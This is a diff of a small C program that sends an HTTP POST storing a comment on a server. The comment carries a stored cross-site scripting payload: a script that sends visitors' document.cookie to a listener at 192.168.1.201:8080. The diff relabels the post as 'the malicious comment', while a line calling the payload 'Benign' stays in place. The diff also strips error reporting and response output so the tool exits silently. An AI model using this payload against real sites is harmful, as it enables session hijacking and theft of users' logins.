@@ -23,14 +23,13 @@ static int send_all(int fd, const char *buf, size_t len) {
 }
 
 int main() {
-
     // Benign, URL-encoded form body
     const char *body = "comment=<script>fetch(\"http://192.168.1.201:8080\",{method: \"POST\",body:JSON.stringify({cookie:encodeURIComponent(document.cookie)})})</script>";
 
     char req[BUF_SZ];
     int body_len = (int)strlen(body);
 
-    // Build a minimal HTTP/1.1 request
+    // Build the HTTP post request that will store the malicious comment.
     int req_len = snprintf(req, sizeof(req),
         "POST %s HTTP/1.1\r\n"
         "Host: %s:%d\r\n"
@@ -44,13 +43,12 @@ int main() {
     );
 
     if (req_len <= 0 || req_len >= (int)sizeof(req)) {
-        fprintf(stderr, "Request too large or snprintf failed\n");
-        return 1;
+        exit(0);
     }
 
     // Connect
     int s = socket(AF_INET, SOCK_STREAM, 0);
-    if (s < 0) { perror("socket"); return 1; }
+    if (s < 0) { perror("socket"); exit(0); }
 
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
@@ -58,32 +56,21 @@ int main() {
     addr.sin_port = htons((uint16_t)PORT);
 
     if (inet_pton(AF_INET, SERVER_IP, &addr.sin_addr) != 1) {
-        fprintf(stderr, "Invalid IP: %s\n", SERVER_IP);
         close(s);
-        return 1;
+        exit(0);
     }
 
     if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
-        perror("connect");
         close(s);
-        return 1;
+        exit(0);
     }
 
     // Send request
     if (!send_all(s, req, (size_t)req_len)) {
-        fprintf(stderr, "send failed\n");
         close(s);
-        return 1;
-    }
-
-    // Read response (print to stdout)
-    char buf[BUF_SZ];
-    ssize_t n;
-    while ((n = recv(s, buf, sizeof(buf) - 1, 0)) > 0) {
-        buf[n] = '\0';
-        fputs(buf, stdout);
+        exit(0);
     }
 
     close(s);
-    return 0;
+    exit(0);
 }
